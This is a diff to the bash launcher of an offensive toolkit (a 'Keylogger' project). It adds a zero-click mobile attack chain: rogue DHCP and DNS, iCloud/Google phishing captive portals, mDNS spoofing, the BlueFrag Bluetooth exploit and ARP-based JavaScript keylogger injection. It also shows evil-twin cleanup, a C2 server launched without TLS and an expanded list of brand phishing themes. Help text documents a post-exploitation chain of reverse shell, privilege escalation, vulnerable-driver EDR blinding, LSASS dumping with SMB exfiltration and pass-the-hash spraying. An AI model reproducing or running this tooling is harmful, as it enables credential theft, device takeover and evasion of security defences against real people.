+        echo ''; echo '[*] Cleaning up evil twin...'
+        kill \$HAP_PID \$DNS_PID \$PORT_PID \$DEAUTH_PID 2>/dev/null
+        pkill hostapd; pkill dnsmasq
+        iptables -t nat -F 2>/dev/null
+        echo 0 > /proc/sys/net/ipv4/ip_forward
+        ip addr flush dev $AP_IFACE 2>/dev/null
+        echo '[*] Done'
+        exit 0
+    " INT TERM
+
+    log "Evil twin running — SSID: $SSID  AP: $AP_IFACE  INET: $INET_IFACE"
+    tail -f "$KL_DIR/logs/credentials.txt" 2>/dev/null
 }
 
 # ══════════════════════════════════════════════════════════════
@@ -2138,7 +3099,7 @@ generate_ios_profile() {
         local CACERT="$PAYLOAD_DIR/ca.crt"
         openssl genrsa -out "$CAKEY" 2048 2>/dev/null
         openssl req -new -x509 -days 365 -key "$CAKEY" -out "$CACERT" \
-            -subj "/CN=Government Portal CA/O=Office of the President/C=GM" 2>/dev/null
+            -subj "/CN=Secure Portal CA/O=Secure Portal/C=US" 2>/dev/null
         CA_B64=$(base64 -w0 "$CACERT" 2>/dev/null)
         ok "CA certificate generated"
     fi
@@ -2273,7 +3234,7 @@ payload_flow() {
         LOG_DIR="$C2_LOG_DIR" \
         LURE_PATH="${LURE_PATH:-/docs}" \
         LURE_TITLE="${LURE_TITLE:-Security Certificate Update}" \
-        python3 "$C2_DIR/c2_server.py" >> "$C2_LOG" 2>&1 &
+        C2_TLS=0 python3 "$C2_DIR/c2_server.py" >> "$C2_LOG" 2>&1 &
     C2_PID=$!
     sleep 3
     if ss -tlnp 2>/dev/null | grep -q ":8888 "; then
@@ -3073,7 +4034,7 @@ worm_flow() {
         LOG_DIR="$C2_LOG_DIR" \
         LURE_PATH="${LURE_PATH:-/docs}" \
         LURE_TITLE="${LURE_TITLE:-Security Certificate Update}" \
-        python3 "$C2_DIR/c2_server.py" >> "$C2_LOG" 2>&1 &
+        C2_TLS=0 python3 "$C2_DIR/c2_server.py" >> "$C2_LOG" 2>&1 &
     C2_PID=$!; sleep 3
     ss -tlnp 2>/dev/null | grep -q ":8888 " && echo -e "${G}✓${N}" || \
         { echo -e "${R}✗${N}"; err "C2 failed"; wait_key; return; }
@@ -3353,11 +4314,12 @@ cmd_help() {
     echo -e "  ${C}bash start status${N}       Show running processes + tunnel URL"
     echo -e "  ${C}bash start creds${N}        Watch captured credentials live"
     echo -e "  ${C}bash start logs${N}         Tail all operation logs"
-    echo -e "  ${C}bash start mobile${N}        Mobile attack module (Android/iOS/Browser/Termux)"
+    echo -e "  ${C}bash start mobile${N}        Mobile attack module (Android/iOS/Browser/Termux/PWN)"
     echo -e "  ${C}bash start mobile android${N}  Build Android msfvenom APK payload"
     echo -e "  ${C}bash start mobile ios${N}      Generate iOS MDM profile (SSL MITM all device HTTPS)"
     echo -e "  ${C}bash start mobile browser${N}  Browser JS RAT — injected by MitM, no install needed"
     echo -e "  ${C}bash start mobile termux${N}   Full Termux Python RAT (GPS/SMS/mic/camera/shell)"
+    echo -e "  ${C}bash start mobile pwn${N}      Zero-click 6-layer PWN chain (DHCP/DNS/Portal/mDNS/BlueFrag/ARP)"
     echo -e "  ${C}bash start kernel${N}       Kernel attack module (check/exploit/rootkit/ebpf/byovd)"
     echo -e "  ${C}bash start kernel check${N}   Scan target for kernel CVEs + privesc vectors"
     echo -e "  ${C}bash start kernel exploit${N} Compile + run CVE exploit (Linux LPE + Windows LPE)"
@@ -3451,6 +4413,7 @@ cmd_help() {
     echo -e "  ${W}Kernel:${N}     BYOVD [driver_path]          (load vuln driver, wipe EDR callbacks)"
     echo -e "              KILL_DEFENDER [layer]          (disable Defender completely)"
     echo -e "  ${W}Zero-click:${N} ZERO_CLICK [action]          (IPv6 RA + WPAD + mDNS + ADIDNS)"
+    echo -e "  ${W}Post-exploit:${N} POST_EXPLOIT               (relay→LPE→BYOVD blind→LSASS→PTH spray)"
     echo -e "  ${W}PS only:${N}    RUN_PS <code>   (AMSI-bypassed PowerShell)"
     echo -e "  ${W}Windows:${N}    INJECT <base64_shellcode>   (svchost injection)"
     echo ""
@@ -3478,7 +4441,9 @@ cmd_help() {
     echo -e "  ${C}bash start theme use <name>${N}    Switch theme (no restart)"
     echo -e "  ${C}bash start theme new <name>${N}    Create blank editable template"
     echo -e "  ${C}bash start theme clone <url>${N}   Clone real site + inject popup"
-    echo -e "  Built-in: ${W}  facebook  google  outlook  blank${N}"
+    echo -e "  Built-in: ${W}facebook  google  outlook  instagram  twitter  linkedin${N}"
+    echo -e "            ${W}tiktok  apple  discord  snapchat  reddit  steam  amazon${N}"
+    echo -e "            ${W}gov-portal  blank   — plus auto-generated for any other domain${N}"
     echo ""
 
     echo -e "  ${Y}━━━ WHICH FILE TO DROP ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
@@ -3674,6 +4639,18 @@ cmd_help2() {
     echo -e "    ZERO_CLICK mdns               mDNS poisoner (macOS/Linux/ChromeOS)"
     echo -e "    ZERO_CLICK adidns             Plant wildcard DNS record in AD"
     echo -e "    ZERO_CLICK dcom <target>      DCOM lateral movement via RPC :135"
+    echo -e "    Note: relay success auto-triggers full post-exploit chain (see POST_EXPLOIT)"
+    echo -e "  ${W}Auto post-exploitation chain:${N}"
+    echo -e "    POST_EXPLOIT                  Run full chain on target: relay→LPE→BYOVD→LSASS→PTH"
+    echo -e "      Step 1: Drop + exec PS reverse shell stager (port 4445)"
+    echo -e "      Step 2: Check privilege level (USER/ADMIN/SYSTEM)"
+    echo -e "      Step 3: GodPotato LPE — Admin→SYSTEM via SeImpersonatePrivilege"
+    echo -e "      Step 4: BYOVD blind — RTCore64 PS payload wipes EDR callbacks + kills Defender"
+    echo -e "      Step 5: LSASS dump — comsvcs MiniDump → SMB exfil, fallback procdump"
+    echo -e "      Step 6: Parse dump — pypykatz (plaintext, NTHash, Kerberos tickets)"
+    echo -e "      Step 7: PTH spray — CrackMapExec /24 with harvested NT hashes"
+    echo -e "      Step 8: Report all loot to operator"
+    echo -e "      Note: relay success auto-triggers chain (no manual trigger needed)"
     echo -e "  ${W}Windows-only:${N}"
     echo -e "    RUN_PS <code>           Run PowerShell with AMSI bypass"
     echo -e "    INJECT <base64_sc>      Inject shellcode into svchost"
@@ -3735,9 +4712,11 @@ cmd_help2() {
     echo -e"     → gains kernel R/W on ANY fully-patched Windows (drivers can't be revoked)"
     echo -e "    Wipes: PspCreateProcessNotifyRoutine · PspLoadImageNotifyRoutine (EDR deaf)"
     echo -e "    Wipes: PspCreateThreadNotifyRoutine · EtwThreatIntProvRegHandle (ATP blind)"
-    echo -e "    ${W}[1]${N} RTCore64.sys (MSI Afterburner IOCTL) — most reliable"
-    echo -e "    ${W}[2]${N} dbutil_2_3.sys (Dell driver — embedded, no drop needed)"
-    echo -e "    ${W}[3]${N} mhyprot2.sys (Genshin Impact — can kill PPL-protected procs)"
+    echo -e "    ${W}[1]${N} RTCore64.sys  MSI Afterburner IOCTL — most reliable"
+    echo -e "    ${W}[2]${N} dbutil_2_3.sys Dell driver — embedded, no drop needed"
+    echo -e "    ${W}[3]${N} mhyprot2.sys  Genshin Impact — kernel R/W + kills PPL procs"
+    echo -e "    ${W}[4]${N} gdrv.sys      CVE-2018-19320 GIGABYTE App Center — arbitrary phys R/W + MSR"
+    echo -e "    kill_defender(): tries mhyprot2 kill IOCTL, falls back to RTCore64 PPL zero"
     echo -e "  ${C}start kernel defender${N}        Kill Defender/EDR completely (6 layers)"
     echo -e "    Layer 1: BYOVD — wipe kernel callbacks (EDR goes deaf)"
     echo -e "    Layer 2: Kill EDR procs — mhyprot2 IOCTL kills PPL-protected MsMpEng/SenseIR"
@@ -3787,6 +4766,23 @@ cmd_help2() {
     echo -e "    Commands polled from C2: gps · contacts · sms · calls · mic · camera"
     echo -e "                             clipboard · ls · shell · wifi · sms_send · info"
     echo -e "    Monitor: C2-URL/mobile"
+    echo -e "  ${C}start mobile pwn${N}             Zero-click 6-layer mobile attack chain (iOS + Android)"
+    echo -e "    ${W}L1 Rogue DHCP:${N}    Race legitimate server — inject attacker as DNS/gateway"
+    echo -e "                   Fingerprints iOS (Option 55: req 252/WPAD) vs Android (26/28)"
+    echo -e "    ${W}L2 Rogue DNS:${N}     Captive-check domains → attacker (auto-opens browser)"
+    echo -e "                   iCloud/Google/Facebook → phishing; everything else → 8.8.8.8"
+    echo -e "    ${W}L3 Captive Portal:${N} Zero user action — iOS/Android auto-trigger every few min"
+    echo -e "                   iCloud UI for iOS / Google UI for Android phishing page"
+    echo -e "                   Collects: GPS, battery, screen, WebRTC IP, sensors, clipboard"
+    echo -e "                   Service Worker installs → persistent C2 after browser close"
+    echo -e "                   Relays 2FA live · Contacts API · Web Bluetooth · Beacon"
+    echo -e "                   All data → C2 /mobile_catch → auto-registered in mobile panel"
+    echo -e "    ${W}L4 mDNS Poison:${N}   Spoof AirPlay/RAOP/AirPrint/Chromecast/AirDrop services"
+    echo -e "                   iOS/Android silently auto-connect to spoofed services"
+    echo -e "    ${W}L5 BlueFrag:${N}      CVE-2020-0022 — BT zero-click RCE (Android 8.0–9.0)"
+    echo -e "                   Raw HCI, L2CAP negative total_len → heap overflow → RFCOMM shell"
+    echo -e "    ${W}L6 ARP Inject:${N}    Classic MitM → JS keylogger into all HTTP responses"
+    echo -e "    C2 auto-starts before chain (ensure_c2). All loot → C2-URL/mobile"
     echo ""
 
     # ── THEMES ─────────────────────────────────────────────────────────────────
@@ -3844,6 +4840,8 @@ cmd_help2() {
     echo -e "  ${W}BYOVD engine:${N}   Keylogger/op/modules/byovd.py"
     echo -e "  ${W}Defender kill:${N}  Keylogger/op/modules/defender_kill.py"
     echo -e "  ${W}Zero-click:${N}     Keylogger/op/modules/zero_click.py"
+    echo -e "  ${W}Post-exploit:${N}   Keylogger/op/modules/post_exploit.py"
+    echo -e "  ${W}Mobile PWN:${N}     Keylogger/op/modules/mobile_pwn.py"
     echo -e "  ${W}Net CVEs:${N}       Keylogger/op/exploit/network_cve.py"
     echo -e "  ${W}Web CVEs:${N}       Keylogger/op/exploit/web_cve.py"
     echo -e "  ${W}eBPF script:${N}    Keylogger/op/kernel/ebpf_keylog.bt"
@@ -3979,6 +4977,7 @@ cmd_help2() {
     echo -e "  ${C}[11]${N} RTCore64.sys   MSI Afterburner — kernel R/W IOCTL, wipe EDR callbacks"
     echo -e "  ${C}[12]${N} dbutil_2_3.sys Dell DBUtil 2.3 — embedded, no download, kernel R/W"
     echo -e "  ${C}[13]${N} mhyprot2.sys   Genshin Impact  — kernel R/W + kills PPL processes"
+    echo -e "  ${C}[14]${N} gdrv.sys       CVE-2018-19320  GIGABYTE App Center ≤2.x — arbitrary phys R/W + MSR"
     echo ""
 
     # ── BUILD ──────────────────────────────────────────────────────────────────
@@ -4018,6 +5017,8 @@ cmd_help2() {
     echo -e "  ${W}Kill Defender:${N}       start kernel defender  →  6 layers, fully patched OK"
     echo -e "  ${W}BYOVD callbacks:${N}     start kernel byovd  →  EDR deaf (any patched Win)"
     echo -e "  ${W}Zero-click chain:${N}    start zeroclick  →  full LAN compromise, no victim action"
+    echo -e "  ${W}Auto post-exploit:${N}  auto-fires on relay success → LPE→BYOVD→LSASS→PTH spray"
+    echo -e "  ${W}Mobile zero-click:${N}  start mobile pwn  →  6-layer chain hits every phone on LAN"
     echo -e "  ${W}WiFi auto-crack:${N}     start wifi auto  →  scan, pick, PMKID/handshake, crack"
     echo -e "  ${W}WiFi evil twin:${N}      start wifi evil_twin  →  rogue AP + credential portal"
     echo -e "  ${W}WiFi deauth:${N}         start wifi deauth <iface> <bssid>"
@@ -4103,10 +5104,14 @@ cmd_mitm() {
 
     step "1" "Starting reverse proxy on :$PROXY_PORT → $TARGET_DOMAIN ..."
     pkill -f mitmdump 2>/dev/null; sleep 1
+    local _proxy_target2
+    _proxy_target2="${TARGET_DOMAIN#http://}"
+    _proxy_target2="${_proxy_target2#https://}"
+    _proxy_target2="${_proxy_target2%%/*}"
     TARGET_DOMAIN=$TARGET_DOMAIN MY_IP=$MY_IP LOG_DIR=$KL_DIR \
         nohup mitmdump \
             -s "$KL_DIR/inject.py" \
-            --mode "reverse:https://$TARGET_DOMAIN" \
+            --mode "reverse:https://$_proxy_target2" \
             --ssl-insecure \
             -p $PROXY_PORT \
             --quiet > "$KL_DIR/proxy.log" 2>&1 &
@@ -4162,7 +5167,7 @@ cmd_payload() {
     info "Starting C2 server on :8888..."
     pkill -f "c2_server.py" 2>/dev/null; sleep 1
     LOG_DIR="$OP/logs" PAYLOAD_DIR="$OP/payloads" MY_IP="$MY_IP" \
-        python3 "$C2_DIR/c2_server.py" >> "$OP/logs/c2.log" 2>&1 &
+        C2_TLS=0 python3 "$C2_DIR/c2_server.py" >> "$OP/logs/c2.log" 2>&1 &
     sleep 2
     if ss -tlnp 2>/dev/null | grep -q ":8888 "; then
         ok "C2 server running on :8888"
@@ -5684,6 +6689,7 @@ cmd_mobile() {
         ios)      mobile_build_ios     ;;
         browser)  mobile_browser_rat   ;;
         termux)   mobile_termux_agent  ;;
+        pwn)      cmd_mobile_pwn       ;;
         *)
             banner
             echo -e "  ${W}MOBILE ATTACK MODULE${N}\n"
@@ -5691,18 +6697,97 @@ cmd_mobile() {
             echo -e "  ${C}[2]${N} iOS MDM         — generate CA cert + profile → SSL MITM all device HTTPS"
             echo -e "  ${C}[3]${N} Browser RAT     — JS injected by MitM (GPS, mic, camera, clipboard, keylog)"
             echo -e "  ${C}[4]${N} Termux Agent    — full Python RAT via Termux (GPS, SMS, contacts, mic, shell)"
+            echo -e "  ${C}[5]${N} ${G}Zero-Click PWN${N}  — DHCP+DNS+Captive Portal+mDNS+BlueFrag chain (no user action)"
             echo ""
-            ask "Select [1-4]:"
+            ask "Select [1-5]:"
             read -r _MCHOICE
             case "$_MCHOICE" in
                 1) mobile_build_android ;;
                 2) mobile_build_ios     ;;
                 3) mobile_browser_rat   ;;
                 4) mobile_termux_agent  ;;
+                5) cmd_mobile_pwn       ;;
                 *) err "Invalid choice" ;;
             esac
             ;;
     esac
+}
+
+cmd_mobile_pwn() {
+    banner
+    echo -e "  ${G}ZERO-CLICK MOBILE PWN${N}\n"
+    echo -e "  ${C}Layers:${N}"
+    echo -e "    L1  Rogue DHCP       — inject our DNS into every phone that connects"
+    echo -e "    L2  Rogue DNS        — intercept iOS/Android captive checks → force portal open"
+    echo -e "    L3  Captive Portal   — iCloud/Google phishing + GPS + SW C2 + fingerprint"
+    echo -e "    L4  mDNS Poisoner    — spoof AirPlay/AirPrint/Chromecast → silent connections"
+    echo -e "    L5  BlueFrag         — CVE-2020-0022 BT RCE (Android 8/9, zero-click)"
+    echo -e "    L6  ARP Inject       — HTTP injection via existing intercept.py"
+    echo ""
+
+    # Get interface if not set
+    if [ -z "${IFACE:-}" ]; then
+        IFACE=$(ip -4 route show default 2>/dev/null | awk '/default/{print $5; exit}')
+        [ -z "$IFACE" ] && IFACE="eth0"
+    fi
+
+    MY_IP=$(ip -4 addr show "$IFACE" 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -1)
+    GW_IP=$(ip -4 route show default 2>/dev/null | awk '/default/{print $3; exit}')
+
+    echo -e "  Interface : ${W}${IFACE}${N}   IP: ${W}${MY_IP}${N}   GW: ${W}${GW_IP}${N}"
+    echo ""
+
+    ask "Enable BlueFrag Bluetooth scan? [y/N]:"
+    read -r _BT_CHOICE </dev/tty
+    BT_FLAG="False"
+    [[ "$_BT_CHOICE" =~ ^[Yy]$ ]] && BT_FLAG="True"
+
+    ask "Enable ARP spoof + HTTP injection for specific target? [y/N]:"
+    read -r _ARP_CHOICE </dev/tty
+    ARP_FLAG="False"
+    TARGET_IP=""
+    if [[ "$_ARP_CHOICE" =~ ^[Yy]$ ]]; then
+        ask "Target IP (e.g. 192.168.1.x):"
+        read -r TARGET_IP </dev/tty
+        ARP_FLAG="True"
+    fi
+
+    echo ""
+    info "Starting C2 server..."
+    ensure_c2
+    local PORTAL_C2_URL="http://${MY_IP}:${C2_ACTIVE_PORT}"
+
+    info "Starting all mobile attack layers... (Ctrl+C to stop)"
+    echo ""
+
+    # iptables: redirect DNS queries to us
+    iptables -t nat -A PREROUTING -i "$IFACE" -p udp --dport 53 \
+             -j REDIRECT --to-port 53 2>/dev/null
+    # HTTP redirect for injection
+    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 \
+             -j REDIRECT --to-port 8080 2>/dev/null
+
+    python3 - <<PYEOF
+import sys, os
+sys.path.insert(0, '/home/heilige/Keylogger/op/modules')
+from mobile_pwn import mobile_pwn_chain
+mobile_pwn_chain(
+    attacker_ip     = '${MY_IP}',
+    iface           = '${IFACE}',
+    gateway_ip      = '${GW_IP}' or None,
+    target_ip       = '${TARGET_IP}' or None,
+    enable_arp      = ${ARP_FLAG},
+    enable_bluefrag = ${BT_FLAG},
+    duration        = 0,
+    c2_url          = '${PORTAL_C2_URL}',
+)
+PYEOF
+
+    # Cleanup iptables
+    iptables -t nat -D PREROUTING -i "$IFACE" -p udp --dport 53 \
+             -j REDIRECT --to-port 53 2>/dev/null
+    iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 80 \
+             -j REDIRECT --to-port 8080 2>/dev/null
 }
 
 # ══════════════════════════════════════════════════════════════
@@ -7390,12 +8475,45 @@ cmd_zeroclick() {
         [ -z "$IFACE" ] && IFACE="eth0"
     fi
 
-    echo -e "${Y}[*] Zero-Click chain — attacker: $IP  iface: $IFACE${N}"
-    sudo python3 -c "
-import sys; sys.path.insert(0,'$DIR/op/modules')
+    banner
+    step 1 "ZERO-CLICK CHAIN"
+    echo ""
+    info "Attacker IP : $IP"
+    info "Interface   : $IFACE"
+    info "All layers launch simultaneously — no victim interaction needed"
+    echo ""
+
+    sudo python3 - "$IP" "$IFACE" "$ACTION" "$DIR" << 'PYEOF'
+import sys, os, time, threading
+
+attacker_ip = sys.argv[1]
+iface       = sys.argv[2]
+action      = sys.argv[3]
+base_dir    = sys.argv[4]
+
+sys.path.insert(0, os.path.join(base_dir, "op", "modules"))
 import zero_click as zc
-zc.run('$ACTION', attacker_ip='$IP', iface='$IFACE')
-"
+
+# Print chain output live
+result = zc.run(action, attacker_ip=attacker_ip, iface=iface, auto_relay=True, duration=0)
+print(result)
+
+# Keep running — show new hashes as they arrive
+print("\n[*] Monitoring for victims... Ctrl+C to stop\n")
+seen = set()
+hash_file = "/tmp/wizza_hashes.txt"
+try:
+    while True:
+        time.sleep(3)
+        if os.path.exists(hash_file):
+            lines = open(hash_file).read().splitlines()
+            for line in lines:
+                if line and line not in seen:
+                    seen.add(line)
+                    print(f"\n  \033[92m[HASH CAPTURED]\033[0m {line[:100]}")
+except KeyboardInterrupt:
+    print("\n[*] Stopped.")
+PYEOF
 }
 
 # ── Entry point — dispatch command or run wizard ─────────────
@@ -7411,6 +8529,7 @@ case "$CMD" in
     up)             init_files; cmd_up ;;
     mitm)           cmd_mitm ;;
     payload)        init_files; cmd_payload ;;
+    c2)             init_files; ensure_c2 ;;
     down)           cmd_down ;;
     status)         init_files; cmd_status ;;
     url)            cmd_url ;;
@@ -7447,7 +8566,17 @@ case "$CMD" in
         VICTIM_IP="$2"; TARGET_DOMAIN="$3"
         [ -z "$VICTIM_IP" ] && { echo "Usage: start physical <victim_ip> <target_domain>"; exit 1; }
         [ -z "$TARGET_DOMAIN" ] && { echo "Usage: start physical <victim_ip> <target_domain>"; exit 1; }
-        MY_IP=$(ip route get 8.8.8.8 2>/dev/null | awk '/src/{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1);exit}}')
+        valid_ip "$VICTIM_IP" || { echo "Error: '$VICTIM_IP' is not a valid IP address."; exit 1; }
+        # Detect MY_IP from same interface as victim (same /24), not routing table
+        # (routing table may return VPN/tunnel IP when Tor is active)
+        local _vic_prefix="${VICTIM_IP%.*}"
+        MY_IP=$(ip -4 addr show | awk '/inet /{print $2}' | cut -d/ -f1 \
+            | while read -r _ip; do
+                [ "${_ip%.*}" = "$_vic_prefix" ] && echo "$_ip" && break
+              done)
+        # fallback
+        [ -z "$MY_IP" ] && MY_IP=$(ip route get 8.8.8.8 2>/dev/null \
+            | awk '/src/{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1);exit}}')
         physical_arp_keylogger
         ;;
     "")             main ;;
